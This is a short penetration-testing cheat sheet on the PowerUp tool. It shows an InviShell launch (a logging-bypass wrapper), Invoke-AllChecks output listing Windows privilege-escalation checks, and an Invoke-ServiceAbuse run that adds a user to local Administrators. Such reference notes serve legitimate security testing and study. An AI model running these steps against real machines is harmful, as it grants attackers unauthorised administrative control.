# PowerUp

#### Invoke-AllChecks

```
C:\Temp> .\InviShell\RunWithRegistryNonAdmin.bat
...
C:\Temp> . .\PowerUp.ps1
C:\Temp> Invoke-AllChecks
...
[*] Checking if user is in a local group with administrative privileges...
...
[*] Checking for unquoted service paths...
...
[*] Checking service executable and argument permissions...
...
[*] Checking service permissions...
...
[*] Checking %PATH% for potentially hijackable DLL locations...
...
[*] Checking for AlwaysInstallElevated registry key...
...
[*] Checking for Autologon credentials in registry...
...
[*] Checking for modifidable registry autoruns and configs...
...
[*] Checking for modifiable schtask files/configs...
...
[*] Checking for unattended install files...
...
[*] Checking for encrypted web.config strings...
...
[*] Checking for encrypted application pool and virtual directory passwords...
...
[*] Checking for plaintext passwords in McAfee SiteList.xml files....
...
```

#### Invoke-ServiceAbuse

```
PS C:\> Invoke-ServiceAbuse -Name 'ServiceName' -UserName planetexpress\pfry

ServiceAbused  Command
-------------  -------
ServiceName net localgroup Administrators planetexpress\pfry /add


PS C:\> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
planetexpress\Domain Admins
planetexpress\pfry
The command completed successfully.
```

{% hint style="info" %}
User must logout and login again to then gain local administrator privileges
{% endhint %}

